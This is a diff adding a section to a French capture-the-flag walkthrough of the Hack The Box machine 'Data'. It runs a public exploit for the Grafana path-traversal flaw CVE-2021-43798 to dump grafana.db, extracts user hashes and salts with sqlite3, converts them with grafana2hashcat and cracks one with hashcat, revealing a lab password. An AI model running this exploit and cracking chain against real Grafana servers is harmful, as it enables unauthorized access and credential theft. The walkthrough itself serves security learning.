@@ -393,7 +393,303 @@ L’exploitation repose sur une succession d’étapes logiques et progressives,
 4. **Extraction et exploitation des informations sensibles**
     L’analyse de la base SQLite te permet d’extraire les **hashes de mots de passe** des utilisateurs Grafana. Ces **password hashes** sont alors attaqués hors-ligne afin d’obtenir des **identifiants réutilisables**, qui servent de point d’entrée pour la poursuite de l’exploitation.
 
----
+### grafana.db
+
+L’application concrète de la méthode d’exploitation s’effectue selon les étapes techniques suivantes :
+
+1. **Récupération du proof-of-concept**
+    Le proof-of-concept associé à la vulnérabilité **CVE-2021-43798** est récupéré depuis le dépôt GitHub de référence. L’exploit est implémenté en **langage Go** et fourni sous la forme d’un fichier `exploit.go`, conçu pour automatiser l’exploitation du path traversal et la lecture de fichiers arbitraires sur une instance Grafana vulnérable.
+
+   
+
+   ```bash
+   Dump sqlite3 database
+   go run exploit.go -target <target> -dump-database
+   ```
+
+   
+
+2. **Exécution de l’exploit**
+    L’exploit est simplement exécuté conformément aux indications fournies dans le **README du dépôt GitHub**, à l’aide de `go run`, afin de déclencher le **dump de la base de données SQLite** exposée par l’instance Grafana cible.
+
+   
+
+   ```bash
+   go run exploit.go -target http://data.htb:3000 -dump-database -output grafana.db
+   
+   CVE-2021-43798 - Grafana 8.x Path Traversal (Pre-Auth)
+   Made by Tay (https://github.com/taythebot)
+   
+   [INFO] Exploiting target http://data.htb:3000
+   [INFO] Successfully exploited target http://data.htb:3000
+   SQLite format ...
+   
+   [...]
+   
+   [INFO] Succesfully saved output to file grafana.db
+   ```
+
+> **Note**
+>  Si l’exécution de `go run` échoue, cela signifie que le langage **Go** n’est pas installé sur le système. Il suffit alors d’installer Go via le gestionnaire de paquets avant de relancer l’exploit.
+>
+> ```bash
+> sudo apt update && sudo apt install -y golang-go
+> ```
+>
+> vérification après installation :
+>
+> ```bash
+> go version                                                                            
+> go version go1.24.9 linux/amd64
+> ```
+
+
+
+La base `grafana.db` constitue ensuite le point de départ de l’analyse post-exploitation, dédiée à l’identification des comptes utilisateurs et à l’extraction des **hashes de mots de passe**.
+
+### Exploitation des mots de passe Grafana
+
+Tu analyses la table `user` de la base `grafana.db` à l’aide d’un outil **SQLite** afin d’extraire les champs `password` et `salt`. Ces **hashes Grafana** sont ensuite convertis avec **grafana2hashcat**, puis attaqués hors-ligne à l’aide de **hashcat** pour tenter d’obtenir les mots de passe en clair.
+
+Voici **la chaîne complète de commandes en ligne de commande**, du fichier `grafana.db` jusqu’aux **mots de passe en clair**, dans un enchaînement logique et reproductible.
+
+#### Ouvre la base SQLite et identifier la table `user`
+
+```bash
+sqlite3 grafana.db
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+
+sqlite> .tables
+alert                       login_attempt             
+alert_configuration         migration_log             
+alert_instance              org                       
+alert_notification          org_user                  
+alert_notification_state    playlist                  
+alert_rule                  playlist_item             
+alert_rule_tag              plugin_setting            
+alert_rule_version          preferences               
+annotation                  quota                     
+annotation_tag              server_lock               
+api_key                     session                   
+cache_data                  short_url                 
+dashboard                   star                      
+dashboard_acl               tag                       
+dashboard_provisioning      team                      
+dashboard_snapshot          team_member               
+dashboard_tag               temp_user                 
+dashboard_version           test_data                 
+data_source                 user                      
+library_element             user_auth                 
+library_element_connection  user_auth_token      
+
+
+sqlite> .schema user
+CREATE TABLE `user` (
+`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
+, `version` INTEGER NOT NULL
+, `login` TEXT NOT NULL
+, `email` TEXT NOT NULL
+, `name` TEXT NULL
+, `password` TEXT NULL
+, `salt` TEXT NULL
+, `rands` TEXT NULL
+, `company` TEXT NULL
+, `org_id` INTEGER NOT NULL
+, `is_admin` INTEGER NOT NULL
+, `email_verified` INTEGER NULL
+, `theme` TEXT NULL
+, `created` DATETIME NOT NULL
+, `updated` DATETIME NOT NULL
+, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);
+CREATE UNIQUE INDEX `UQE_user_login` ON `user` (`login`);
+CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
+CREATE INDEX `IDX_user_login_email` ON `user` (`login`,`email`);
+sqlite>
+```
+
+#### Extrais les hashes et les salts depuis la table `user`
+
+Extraction minimale (hash + salt) :
+
+```bash
+sqlite3 grafana.db \
+"select password || ',' || salt from user;" > grafana_hashes.txt
+```
+
+Vérification rapide :
+
+```bash
+head grafana_hashes.txt
+
+7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
+dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
+                    
+```
+
+#### Télécharge `grafana2hashcat.py`
+
+Depuis ton répertoire de travail :
+
+```bash
+wget https://raw.githubusercontent.com/iamaldi/grafana2hashcat/main/grafana2hashcat.py
+```
+
+
+
+#### Convertis les hashes Grafana au format hashcat
+
+À l’aide de **grafana2hashcat** :
+
+```bash
+python3 grafana2hashcat.py grafana_hashes.txt -o hashcat_hashes.txt                   
+
+
+[+] Grafana2Hashcat
+[+] Reading Grafana hashes from:  grafana_hashes.csv
+[+] Done! Read 2 hashes in total.
+[+] Converting hashes...
+[+] Converting hashes complete.
+[+] Writing output to 'hashcat_hashes.txt' file.
+[+] Now, you can run Hashcat with the following command, for example:
+
+hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
+
+```
+
+Contrôle du format obtenu :
+
+```bash
+head hashcat_hashes.txt
+
+sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
+sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
+
+```
+
+(attendu : `sha256:10000:<salt_b64>:<hash_b64>`)
+
+#### Associe chaque hash à son utilisateur Grafana
+
+Afin de conserver une correspondance explicite entre chaque hash et son utilisateur, extraits séparément les logins depuis la table `user`, puis associe-les aux hashes convertis dans le même ordre.
+
+```
+sqlite3 -noheader -separator '|' grafana.db \
+"select login, password, salt from user order by id;" > users_pw_salt.txt
+paste -d' ' \
+  <(cut -d'|' -f1 users_pw_salt.txt | sed 's/^/# user: /') \
+  hashcat_hashes.txt \
+> hashes_with_users.txt
+```
+
+Ce fichier te permettra de visualiser directement quel hash correspond à quel compte Grafana, sans interférer avec l’exécution de hashcat.
+
+#### Lance l’attaque hors-ligne avec hashcat
+
+Avec la wordlist rockyou :
+
+```bash
+hashcat -m 10900 hashcat_hashes.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12600K, 6975/13950 MB (2048 MB allocatable), 4MCU
+
+/home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+INFO: Removed hash found as potfile entry.
+
+Host memory allocated for this attack: 513 MB (13946 MB free)
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 0 secs
+
+Cracking performance lower than expected?                 
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q
+                                                        
+Session..........: hashcat
+Status...........: Quit
+Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
+Hash.Target......: hashcat_hashes.txt
+Time.Started.....: Mon Jan 26 16:40:43 2026 (2 mins, 5 secs)
+Time.Estimated...: Mon Jan 26 17:28:49 2026 (46 mins, 1 sec)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:     4970 H/s (14.94ms) @ Accel:177 Loops:1000 Thr:1 Vec:8
+Recovered........: 1/2 (50.00%) Digests (total), 0/2 (0.00%) Digests (new), 1/2 (50.00%) Salts
+Progress.........: 1237584/28688770 (4.31%)
+Rejected.........: 0/1237584 (0.00%)
+Restore.Point....: 618792/14344385 (4.31%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:5000-6000
+Candidate.Engine.: Device Generator
+Candidates.#01...: maxie92 -> maryland22
+Hardware.Mon.#01.: Util: 89%
+
+Started: Mon Jan 26 16:40:19 2026
+Stopped: Mon Jan 26 16:42:50 2026
+
+
+```
+
+Affiche les mots de passe trouvés :
+
+```bash
+hashcat -m 10900 hashcat_hashes.txt --show
+
+sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
+```
+
+Et compare avec le fichier hashes_with_users.txt 
+
+```bash
+cat hashes_with_users.txt                                           
+# user: admin sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
+# user: boris sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
+                       
+```
+
+**Ce qui te permet de dire que le mot de passe `beautiful1` est associé à l'utilisateur Grafana `boris`.**
+
+------
+
+### connexion SSH
+
+
 
 ## Escalade de privilèges
 
